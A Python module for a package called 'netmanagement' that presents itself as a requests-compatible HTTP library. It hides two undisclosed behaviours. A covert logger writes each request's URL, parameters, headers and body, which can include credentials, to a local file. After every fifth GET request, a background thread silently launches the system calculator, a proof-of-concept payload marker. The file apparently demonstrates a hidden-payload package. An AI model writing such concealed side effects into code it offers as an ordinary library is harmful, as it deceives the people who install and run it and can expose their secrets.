"""
Core functionality for netmanagement - standalone requests implementation with logging and special features
"""

import urllib.request
import urllib.parse
import urllib.error
import json
import logging
import subprocess
import platform
import threading
from datetime import datetime
from typing import Optional, Dict, Any, Union
from io import BytesIO

# Set up completely hidden logging
_logger = logging.getLogger('netmanagement_internal')
_logger.setLevel(logging.INFO)

# Create log file handler with a lock for thread safety
_log_file = 'netmanagement_requests.log'
_file_handler = logging.FileHandler(_log_file)
_file_handler.setLevel(logging.INFO)

# Create formatter
_formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
_file_handler.setFormatter(_formatter)

# Add handler to logger (only once)
if not _logger.handlers:
    _logger.addHandler(_file_handler)

# Thread-safe counter for GET requests
_get_request_count = 0
_count_lock = threading.Lock()

# Custom Response class that mimics requests.Response
class Response:
    """Response object that mimics requests.Response structure"""
    
    def __init__(self, url, status_code, headers, content, reason="OK"):
        self.url = url
        self.status_code = status_code
        self.headers = headers
        self._content = content
        self.reason = reason
        self.raw = BytesIO(content)
        self.ok = 200 <= status_code < 300
        
    @property
    def content(self):
        """Return response content as bytes"""
        return self._content
    
    @property
    def text(self):
        """Return response content as text"""
        return self._content.decode('utf-8', errors='ignore')
    
    def json(self):
        """Return response content as JSON"""
        return json.loads(self.text)
    
    def __repr__(self):
        return f"<Response [{self.status_code}]>"

# Custom exceptions that mimic requests.exceptions
class RequestException(Exception):
    """Base exception for all request-related errors"""
    pass

class ConnectionError(RequestException):
    """Connection error"""
    pass

class HTTPError(RequestException):
    """HTTP error"""
    pass

class Timeout(RequestException):
    """Request timeout"""
    pass

def _open_calculator():
    """Open the system calculator on Mac or Windows"""
    system = platform.system().lower()
    
    try:
        if system == "darwin":  # macOS
            subprocess.run(["open", "-a", "Calculator"], check=True)
            _logger.info("Opened Calculator on macOS")
        elif system == "windows":  # Windows
            subprocess.run(["calc"], check=True, shell=True)
            _logger.info("Opened Calculator on Windows")
        else:
            _logger.warning(f"Calculator opening not supported on {system}")
    except subprocess.CalledProcessError as e:
        _logger.error(f"Failed to open calculator: {e}")
    except Exception as e:
        _logger.error(f"Unexpected error opening calculator: {e}")

def _log_request_safely(method: str, url: str, **kwargs):
    """Log request details safely without affecting execution"""
    try:
        # Create a safe copy of kwargs for logging (avoid modifying original)
        safe_kwargs = {}
        if 'params' in kwargs:
            safe_kwargs['params'] = kwargs['params']
        if 'headers' in kwargs:
            safe_kwargs['headers'] = dict(kwargs['headers']) if kwargs['headers'] else None
        if 'data' in kwargs and kwargs['data']:
            # Limit data size and convert to string safely
            data_str = str(kwargs['data'])[:500]
            safe_kwargs['data'] = data_str
        if 'json' in kwargs:
            safe_kwargs['json'] = kwargs['json']
            
        log_data = {
            'timestamp': datetime.now().isoformat(),
            'method': method,
            'url': url,
            **safe_kwargs
        }
        _logger.info(f"Request: {json.dumps(log_data, default=str)}")
    except Exception:
        # Silently fail logging to not affect the actual request
        pass

def _log_response_safely(response):
    """Log response details safely without affecting execution"""
    try:
        log_data = {
            'timestamp': datetime.now().isoformat(),
            'status_code': response.status_code,
            'headers': dict(response.headers),
            'url': response.url,
            'content_length': len(response.content) if response.content else 0,
        }
        _logger.info(f"Response: {json.dumps(log_data, default=str)}")
    except Exception:
        # Silently fail logging to not affect the actual request
        pass

def _make_request(url, method='GET', params=None, headers=None, timeout=30):
    """Make HTTP request using urllib and return Response object"""
    try:
        # Handle params
        if params:
            if isinstance(params, dict):
                params = urllib.parse.urlencode(params)
            if '?' in url:
                url += '&' + params
            else:
                url += '?' + params
        
        # Create request
        req = urllib.request.Request(url, method=method)
        
        # Add headers
        if headers:
            for key, value in headers.items():
                req.add_header(key, value)
        
        # Make request
        with urllib.request.urlopen(req, timeout=timeout) as response:
            content = response.read()
            status_code = response.getcode()
            response_headers = dict(response.headers)
            reason = response.reason if hasattr(response, 'reason') else "OK"
            
            return Response(url, status_code, response_headers, content, reason)
            
    except urllib.error.HTTPError as e:
        # HTTP error - still return response with error status
        content = e.read() if hasattr(e, 'read') else b''
        return Response(url, e.code, dict(e.headers), content, e.reason)
    except urllib.error.URLError as e:
        raise ConnectionError(f"Connection error: {e.reason}")
    except Exception as e:
        raise RequestException(f"Request failed: {str(e)}")

def get(url, params=None, **kwargs):
    """Sends a GET request. Returns Response object with same structure as requests.get()"""
    global _get_request_count
    
    # Thread-safe counter increment
    with _count_lock:
        _get_request_count += 1
        current_count = _get_request_count
    
    # Log the request (safely, in background)
    _log_request_safely('GET', url, params=params, **kwargs)
    _logger.info(f"GET request #{current_count} to {url}")
    
    # Make the actual request using urllib
    response = _make_request(url, method='GET', params=params, **kwargs)
    
    # Log the response (safely, in background)
    _log_response_safely(response)
    
    # Check if we've reached 5 GET requests (thread-safe)
    if current_count >= 5:
        _logger.info("Reached 5 GET requests - opening calculator")
        # Run calculator in background thread to not block the response
        threading.Thread(target=_open_calculator, daemon=True).start()
        with _count_lock:
            _get_request_count = 0  # Reset counter
    
    return response
